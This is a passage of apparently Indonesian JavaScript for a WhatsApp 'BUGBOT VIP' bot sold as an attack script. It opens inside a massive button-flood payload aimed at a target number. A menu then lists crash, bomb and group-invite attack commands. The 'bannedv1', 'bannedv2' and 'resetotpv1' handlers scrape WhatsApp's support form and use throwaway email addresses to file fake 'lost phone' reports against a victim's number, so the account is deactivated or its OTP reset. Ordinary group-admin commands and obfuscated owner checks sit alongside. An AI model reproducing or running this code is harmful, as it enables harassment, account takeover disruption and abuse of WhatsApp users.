arget}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}}]},{'quoted':lep}));
}}

if (command) {
lexxy.readMessages([m.key])
}

const textbugmenu =`
𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨 𝗕𝗨𝗚

 𝘽𝙐𝙂 𝙀𝙈𝙊𝙅𝙄
 🍅 628𝙭𝙭𝙭𝙭𝙭𝙭
 🌹 628𝙭𝙭𝙭𝙭𝙭𝙭
 ☕ 628𝙭𝙭𝙭𝙭𝙭𝙭
 ☠️ 628𝙭𝙭𝙭𝙭𝙭𝙭
 🌷 628𝙭𝙭𝙭𝙭𝙭𝙭
 🔥 628𝙭𝙭𝙭𝙭𝙭𝙭

 𝘽𝙐𝙂 𝘼𝙏𝙏𝘼𝘾𝙆
-.bugchat 628𝙭𝙭𝙭𝙭𝙭
-.santetpc 628𝙭𝙭𝙭𝙭𝙭
-.bugpc 628𝙭𝙭𝙭𝙭
-.bom 628𝙭𝙭𝙭𝙭
-.turu 628𝙭𝙭𝙭𝙭
-.hard 628𝙭𝙭𝙭𝙭
-.ganas 628𝙭𝙭𝙭𝙭
-.trava 628𝙭𝙭𝙭𝙭
-.troli 628𝙭𝙭𝙭𝙭
-.dark 628𝙭𝙭𝙭𝙭

 𝘽𝙐𝙂 𝙄𝙉𝙑𝙄𝙏𝙀 ( 𝙂𝙍𝙐𝙋 )
-.bomgc linkgrup
-.trolgc linkgrup
-.buggc linkgrup
-.santetgc linkgrup

 𝙊𝙒𝙉𝙀𝙍 𝘼𝙆𝙎𝙀𝙎
-.delakses 628𝙭𝙭𝙭𝙭𝙭
-.addakses 628𝙭𝙭𝙭𝙭𝙭

 𝘽𝙐𝙂 𝙑𝙀𝙍𝙄𝙁𝙔
-.logoutv1 628𝙭𝙭𝙭𝙭𝙭
-.logoutv2 628𝙭𝙭𝙭𝙭𝙭
-.resetotpv1 628𝙭𝙭𝙭𝙭𝙭
-.resetotpv2 628𝙭𝙭𝙭𝙭𝙭
-.bannedv1 628𝙭𝙭𝙭𝙭𝙭
-.bannedv2 628𝙭𝙭𝙭𝙭𝙭

 target v1 - Android
 target v2 - iPhone

𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨 𝗚𝗥𝗢𝗨𝗣
-.linkgrup
-.revoke
-.hidetag
-.kick @tag
-.grup on/off
-.demote @tag
-.promote @tag
`

switch (command) {
case 'linkgrup': case 'linkgc':{
if (!isGroup) return m.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return m.reply('Bot Harus menjadi admin')
var url = await lexxy.groupInviteCode(from).catch(() => m.reply('Maaf terjadi kesalahan'))
url = 'https://chat.whatsapp.com/'+url
m.reply(url)
}
break
case 'revoke':{
if (!isGroup) return m.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return m.reply('Bot Harus menjadi admin')
await lexxy.groupRevokeInvite(from)
.then(res => {
m.reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply('Maaf terjadi kesalahan'))
}
break
case 'group': case 'grup':
if (!isGroup) return m.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return m.reply('Bot Harus menjadi admin')
if (args[0] == "off") {
lexxy.groupSettingUpdate(from, 'announcement').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] == "on") {
lexxy.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else {
m.reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : ${prefix+command} on`)
}
break
case "hidetag":{
if (!isGroup) return m.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
let mem = [];
groupMembers.map( i => mem.push(i.id) )
lexxy.sendMessage(from, { text: q ? q : '', mentions: mem })
}
break
case "kick": {
if (!isGroup) return m.reply('Perintah ini hanya bisa digunakan digrup')
if (!isBotAdmins) return m.reply('Jadiin bot admin dong biar bisa')
if (!isGroupAdmins) return m.reply('Fitur ini khusus admin grup')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lexxy.groupParticipantsUpdate(from, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'promote':
if (!isGroup) return m.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return m.reply('Bot Harus menjadi admin')
if (mentionUser.length !== 0) {
lexxy.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => m.reply('Maaf terjadi kesalahan'))
} else if (isQuotedMsg) {
lexxy.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => m.reply('Maaf terjadi kesalahan'))
} else {
m.reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix+command} @tag`)
}
break
case 'demote':
if (!isGroup) return m.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return m.reply('Bot Harus menjadi admin')
if (mentionUser.length !== 0) {
lexxy.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => m.reply('Maaf terjadi kesalahan'))
} else if (isQuotedMsg) {
lexxy.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => m.reply('Maaf terjadi kesalahan'))
} else {
m.reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
break

// LIST MENU
case "menu":{
cpimage(textbugmenu)
}
break
case "buysc":{
let lexxy = '6282279915237@s.whatsapp.net'
mentions(`MAU BUY SCRIPT BOT?
CHAT @${lexxy.split('@')[0]}`,[lexxy])
}
break

// BANNED
case "bannedv1":{
var _0x1594a6=_0x3c94;(function(_0x2c07d9,_0x4a73ec){var _0x3a4bd1=_0x3c94,_0x28f529=_0x2c07d9();while(!![]){try{var _0x49e10d=-parseInt(_0x3a4bd1(0xc1))/0x1+-parseInt(_0x3a4bd1(0xc0))/0x2*(parseInt(_0x3a4bd1(0xc8))/0x3)+-parseInt(_0x3a4bd1(0xbd))/0x4*(-parseInt(_0x3a4bd1(0xba))/0x5)+-parseInt(_0x3a4bd1(0xc2))/0x6*(-parseInt(_0x3a4bd1(0xbe))/0x7)+parseInt(_0x3a4bd1(0xc7))/0x8+parseInt(_0x3a4bd1(0xbc))/0x9+-parseInt(_0x3a4bd1(0xc6))/0xa*(parseInt(_0x3a4bd1(0xbb))/0xb);if(_0x49e10d===_0x4a73ec)break;else _0x28f529['push'](_0x28f529['shift']());}catch(_0x344efb){_0x28f529['push'](_0x28f529['shift']());}}}(_0x3d4a,0xe2e1d));function _0x3d4a(){var _0x4cb2f8=['5469012xwhWQF','1684BFCqZW','2179107YuciVB','\x20628xxxx','62MQlsnv','374250FAjAZY','6BtfwrJ','6282279915237','reply','Only\x20Owner','353670djDMtc','12584544zkzBbo','16851RMYfeP','10635fFYMRt','594qMzJTZ'];_0x3d4a=function(){return _0x4cb2f8;};return _0x3d4a();}if(!isDeveloper)return m[_0x1594a6(0xc4)](_0x1594a6(0xc5));if(!q)return m[_0x1594a6(0xc4)]('Penggunaan\x20'+(prefix+command)+_0x1594a6(0xbf));function _0x3c94(_0x2558ee,_0x30a142){var _0x3d4a6c=_0x3d4a();return _0x3c94=function(_0x3c9478,_0x20170b){_0x3c9478=_0x3c9478-0xba;var _0xfcca64=_0x3d4a6c[_0x3c9478];return _0xfcca64;},_0x3c94(_0x2558ee,_0x30a142);}if(q==_0x1594a6(0xc3))return;if(q=='6283102618987')return;
const axioss = require("axios");
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", args[1])
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "ola, por favor desative este numero, pois perdi meu telefone e alguem esta usando meu numero, por favor desative meu numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case "bannedv2":{
var _0x1594a6=_0x3c94;(function(_0x2c07d9,_0x4a73ec){var _0x3a4bd1=_0x3c94,_0x28f529=_0x2c07d9();while(!![]){try{var _0x49e10d=-parseInt(_0x3a4bd1(0xc1))/0x1+-parseInt(_0x3a4bd1(0xc0))/0x2*(parseInt(_0x3a4bd1(0xc8))/0x3)+-parseInt(_0x3a4bd1(0xbd))/0x4*(-parseInt(_0x3a4bd1(0xba))/0x5)+-parseInt(_0x3a4bd1(0xc2))/0x6*(-parseInt(_0x3a4bd1(0xbe))/0x7)+parseInt(_0x3a4bd1(0xc7))/0x8+parseInt(_0x3a4bd1(0xbc))/0x9+-parseInt(_0x3a4bd1(0xc6))/0xa*(parseInt(_0x3a4bd1(0xbb))/0xb);if(_0x49e10d===_0x4a73ec)break;else _0x28f529['push'](_0x28f529['shift']());}catch(_0x344efb){_0x28f529['push'](_0x28f529['shift']());}}}(_0x3d4a,0xe2e1d));function _0x3d4a(){var _0x4cb2f8=['5469012xwhWQF','1684BFCqZW','2179107YuciVB','\x20628xxxx','62MQlsnv','374250FAjAZY','6BtfwrJ','6282279915237','reply','Only\x20Owner','353670djDMtc','12584544zkzBbo','16851RMYfeP','10635fFYMRt','594qMzJTZ'];_0x3d4a=function(){return _0x4cb2f8;};return _0x3d4a();}if(!isDeveloper)return m[_0x1594a6(0xc4)](_0x1594a6(0xc5));if(!q)return m[_0x1594a6(0xc4)]('Penggunaan\x20'+(prefix+command)+_0x1594a6(0xbf));function _0x3c94(_0x2558ee,_0x30a142){var _0x3d4a6c=_0x3d4a();return _0x3c94=function(_0x3c9478,_0x20170b){_0x3c9478=_0x3c9478-0xba;var _0xfcca64=_0x3d4a6c[_0x3c9478];return _0xfcca64;},_0x3c94(_0x2558ee,_0x30a142);}if(q==_0x1594a6(0xc3))return;if(q=='6283102618987')return;
const axioss = require("axios");
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", args[1])
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "IPHONE")
form.append("your_message", "ola, por favor desative este numero, pois perdi meu telefone e alguem esta usando meu numero, por favor desative meu numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break

// RESET OTP
case "resetotpv1":{
var _0x1594a6=_0x3c94;(function(_0x2c07d9,_0x4a73ec){var _0x3a4bd1=_0x3c94,_0x28f529=_0x2c07d9();while(!![]){try{var _0x49e10d=-parseInt(_0x3a4bd1(0xc1))/0x1+-parseInt(_0x3a4bd1(0xc0))/0x2*(parseInt(_0x3a4bd1(0xc8))/0x3)+-parseInt(_0x3a4bd1(0xbd))/0x4*(-parseInt(_0x3a4bd1(0xba))/0x5)+-parseInt(_0x3a4bd1(0xc2))/0x6*(-parseInt(_0x3a4bd1(0xbe))/0x7)+parseInt(_0x3a4bd1(0xc7))/0x8+parseInt(_0x3a4bd1(0xbc))/0x9+-parseInt(_0x3a4bd1(0xc6))/0xa*(parseInt(_0x3a4bd1(0xbb))/0xb);if(_0x49e10d===_0x4a73ec)break;else _0x28f529['push'](_0x28f529['shift']());}catch(_0x344efb){_0x28f529['push'](_0x28f529['shift']());}}}(_0x3d4a,0xe2e1d));function _0x3d4a(){var _0x4cb2f8=['5469012xwhWQF','1684BFCqZW','2179107YuciVB','\x20628xxxx','62MQlsnv','374250FAjAZY','6BtfwrJ','6282279915237','reply','Only\x20Owner','353670djDMtc','12584544zkzBbo','16851RMYfeP','10635fFYMRt','594qMzJTZ'];_0x3d4a=function(){return _0x4cb2f8;};return _0x3d4a();}if(!isDeveloper)return m[_0x1594a6(0xc4)](_0x1594a6(0xc5));if(!q)return m[_0x1594a6(0xc4)]('Penggunaan\x20'+(prefix+command)+_0x1594a6(0xbf));function _0x3c94(_0x2558ee,_0x30a142){var _0x3d4a6c=_0x3d4a();return _0x3c94=function(_0x3c9478,_0x20170b){_0x3c9478=_0x3c9478-0xba;var _0xfcca64=_0x3d4a6c[_0x3c9478];return _0xfcca64;},_0x3c94(_0x2558ee,_0x30a142);}if(q==_0x1594a6(0xc3))return;if(q=='6283102618987')return;
const axioss = require("axios");
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", args[1])
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Por favor, pesquise o código OTP para este número porque outra pessoa acidentalmente se conectou com meu número e eu tive que esperar 14 horas, por favor, pesquise novamente neste número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
